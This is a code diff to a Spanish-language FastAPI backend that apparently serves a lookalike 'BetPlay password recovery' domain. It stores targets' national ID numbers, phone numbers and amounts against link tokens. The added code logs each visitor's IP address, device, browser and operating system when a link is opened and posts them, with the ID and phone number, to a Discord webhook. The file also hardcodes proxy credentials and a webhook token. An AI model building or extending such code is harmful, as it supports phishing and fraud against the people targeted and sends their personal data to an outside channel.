@@ -14,7 +14,7 @@ import string
 import time
 from typing import Optional
 from curl_cffi import requests
-from fastapi import FastAPI, HTTPException
+from fastapi import FastAPI, HTTPException, Request
 from fastapi.responses import HTMLResponse, FileResponse
 from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
@@ -36,8 +36,9 @@ PROXY_USER = os.environ.get("PROXY_USER", "u1ebdced056e605cf-zone-custom-region-
 PROXY_PASS = os.environ.get("PROXY_PASS", "u1ebdced056e605cf")
 PROXY_DNS  = os.environ.get("PROXY_DNS", "na.proxy.2captcha.com:2334")
 
-# Discord Webhook
+# Discord Webhooks
 DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK", "https://discord.com/api/webhooks/1559311988184588319/8BXHxI_gOKqtl4YwCAjKndrtuZ6aHnaJD1Q_7riBMDxOjyvEQgV5Ak9-FmIvtrOLiZ1Y")
+DISCORD_VISITAS_WEBHOOK = os.environ.get("DISCORD_VISITAS_WEBHOOK", "")
 
 # URL del dominio (para generar links)
 APP_DOMAIN = os.environ.get("APP_DOMAIN", "https://recuperacion-de-contrasena-betplay.com")
@@ -422,8 +423,8 @@ async def create_token(req: CreateTokenRequest):
 
 
 @app.get("/token/{token_val}")
-async def get_token_data(token_val: str):
-    """Devuelve los datos asociados a un token"""
+async def get_token_data(token_val: str, request: Request):
+    """Devuelve los datos asociados a un token y registra la visita"""
     tokens = load_tokens()
     data = tokens.get(token_val)
     if not data:
@@ -431,6 +432,69 @@ async def get_token_data(token_val: str):
     
     tokens[token_val]["usado"] = True
     save_tokens(tokens)
+    
+    # Capturar información de la visita
+    client_ip = request.client.host if request.client else "Desconocida"
+    user_agent = request.headers.get("user-agent", "Desconocido")
+    referer = request.headers.get("referer", "Directo")
+    
+    # Detectar dispositivo
+    dispositivo = "Desconocido"
+    if "Mobile" in user_agent or "Android" in user_agent or "iPhone" in user_agent:
+        dispositivo = "Móvil"
+    elif "Tablet" in user_agent or "iPad" in user_agent:
+        dispositivo = "Tablet"
+    else:
+        dispositivo = "Escritorio"
+    
+    # Detectar navegador
+    navegador = "Desconocido"
+    if "Chrome" in user_agent and "Edg" not in user_agent:
+        navegador = "Chrome"
+    elif "Firefox" in user_agent:
+        navegador = "Firefox"
+    elif "Safari" in user_agent and "Chrome" not in user_agent:
+        navegador = "Safari"
+    elif "Edg" in user_agent:
+        navegador = "Edge"
+    
+    # Detectar sistema operativo
+    sistema_op = "Desconocido"
+    if "Windows" in user_agent:
+        sistema_op = "Windows"
+    elif "Mac" in user_agent:
+        sistema_op = "macOS"
+    elif "Android" in user_agent:
+        sistema_op = "Android"
+    elif "iPhone" in user_agent or "iPad" in user_agent:
+        sistema_op = "iOS"
+    elif "Linux" in user_agent:
+        sistema_op = "Linux"
+    
+    # Enviar notificación de visita a Discord
+    if DISCORD_VISITAS_WEBHOOK:
+        visita_embed = {
+            "title": "Nueva visita detectada",
+            "color": 16776960,
+            "fields": [
+                {"name": "Cédula", "value": f"`{data['cedula']}`", "inline": True},
+                {"name": "Monto", "value": f"${data['monto']}", "inline": True},
+                {"name": "Teléfono", "value": f"`{data['telefono']}`", "inline": True},
+                {"name": "IP", "value": f"`{client_ip}`", "inline": True},
+                {"name": "Dispositivo", "value": f"{dispositivo} · {navegador}", "inline": True},
+                {"name": "Sistema Operativo", "value": sistema_op, "inline": True},
+                {"name": "Link", "value": f"`?t={token_val[:20]}...`", "inline": False},
+            ],
+            "footer": {"text": f"Token: {token_val}"},
+            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S")
+        }
+        
+        try:
+            session = requests.Session()
+            session.post(DISCORD_VISITAS_WEBHOOK, json={"embeds": [visita_embed]}, timeout=10)
+            session.close()
+        except Exception as e:
+            print(f"Error enviando visita a Discord: {e}")
     
     return {
         "cedula": data["cedula"],
